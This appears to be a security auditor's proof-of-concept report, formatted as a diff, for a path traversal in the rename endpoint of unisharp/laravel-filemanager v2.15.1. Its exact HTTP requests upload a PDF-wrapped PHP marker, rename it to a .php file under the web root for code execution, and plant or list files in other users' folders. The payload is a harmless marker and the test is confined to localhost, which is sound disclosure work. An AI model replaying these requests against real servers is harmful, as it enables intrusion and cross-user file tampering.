@@ -1,0 +1,60 @@
+LFM-01 - Authenticated path traversal in rename -> arbitrary move + controlled extension -> RCE
+Target: unisharp/laravel-filemanager v2.15.1 (commit 28b491d; installed copy byte-identical to audited repo, verified by diff)
+Stack under test: Laravel 13.33.0 + league/flysystem 3.36.0 (v3) + PHP 8.4.26, package DEFAULT config (config/lfm.php not published; defaults: disk=public, alphanumeric_filename=false, alphanumeric_directory=false, should_validate_mime=true, disallowed_mimetypes=[text/x-php,text/html,text/plain], disallowed_extensions=[php,html])
+Scope: 127.0.0.1:8080 only. Payload = harmless marker (md5), no shell functionality.
+Marker expected: "LFM-01-TEST-" . md5("poc") = LFM-01-TEST-302fac1d6d73cf4fdf2c9919195df864
+
+[1] Authenticated upload of PDF-wrapped PHP marker (passes default upload validation)
+    File poc.pdf content:
+        %PDF-1.4
+        <?php echo "LFM-01-TEST-".md5("poc"); ?>
+        %%EOF
+    php mime_content_type -> application/pdf (in category 'file' valid_mime whitelist)
+    POST /filemanager/upload?type=file  (multipart field "upload"; session of user id=1; X-XSRF-TOKEN header)
+    -> HTTP 200  {"url":"http://localhost:8000/storage/files/1/poc.pdf","uploaded":".../storage/files/1/poc.pdf"}
+    Landed at storage/app/public/files/1/poc.pdf (56 bytes)
+    NOTE: direct upload of .php is correctly blocked: POST shell.php -> {"error":{"message":"Invalid file detected"}}
+    (blocklist works at upload; rename is the bypass that never re-validates)
+
+[2] Rename with '..' traversal: escape own private folder AND switch extension to .php
+    GET /filemanager/rename?working_dir=/1&file=poc.pdf&new_name=../../poc.php
+    -> HTTP 200 "OK"
+    Result on disk: storage/app/public/files/1/poc.pdf GONE; storage/app/public/poc.php EXISTS
+    (storage/app/public is the 'public' disk root, web-served via public/storage symlink)
+    Sink chain: RenameController::getRename() -> LfmPath::path('storage') (normalizeWorkingDir concatenates raw
+    new_name, no '..' filtering anywhere in src/) -> LfmStorageRepository::move() -> disk->move(raw, raw)
+
+[3] RCE confirmation - uploaded marker file executes as PHP
+    GET /storage/poc.php
+    -> HTTP 200
+        %PDF-1.4
+        LFM-01-TEST-302fac1d6d73cf4fdf2c9919195df864%%EOF
+    Output matches md5("poc") exactly => attacker-uploaded file now executes as PHP under the web root,
+    with zero config changes to a fresh Laravel install.
+
+[4] Root-escape probe (beyond storage root) - blocked on Flysystem v3
+    GET /filemanager/rename?working_dir=/1&file=escape-src.txt&new_name=../../../../escape-target.txt
+    -> HTTP 500 (Laravel error page), no file written above storage/app/public
+    laravel.log: "local.ERROR: Path traversal detected: files/1/../../../../escape-target.txt"
+    exception: League\Flysystem\PathTraversalDetected (WhitespacePathNormalizer)
+    => Writing outside the disk root requires Flysystem v1 (Laravel <=8 era). Note: the audited package
+    version v2.15.1 itself composer-requires "league/flysystem": ">=2.0.0" (constraint added at patch
+    level; v2.15.0 had none), so root-escape applies to LFM versions without the flysystem floor running
+    on Flysystem v1. Within-root impact below is unaffected and is sufficient for RCE on defaults.
+
+[5] Cross-user arbitrary move (within root, horizontal)
+    GET /filemanager/rename?working_dir=/1&file=escape-src.txt&new_name=../2/planted-by-user1.php
+    -> HTTP 200 "OK"
+    Result: storage/app/public/files/2/planted-by-user1.php EXISTS (user 2's private folder),
+    extension switched to .php. Any authenticated user can move their file into any other user's
+    private folder with an attacker-chosen name/extension.
+
+[6] Bonus - cross-user listing via the same prefix-check bypass
+    MultiUser middleware validates working_dir with Str::startsWith() only:
+    GET /filemanager/jsonitems?type=file&working_dir=/1/../2   (as user 1)
+    -> HTTP 200 JSON listing user 2's items ("secret-dir", "planted-by-user1.php")
+    (same root cause: no normalization anywhere in src/LfmPath.php)
+
+Conclusion: LFM-01 VERIFIED. Rename accepts raw '..' paths; default config allows arbitrary within-root
+move with attacker-controlled extension; combined with the permissive default upload rules this yields
+unauthenticated-to-none, low-priv authenticated RCE on the newest supported Laravel/Flysystem stack.
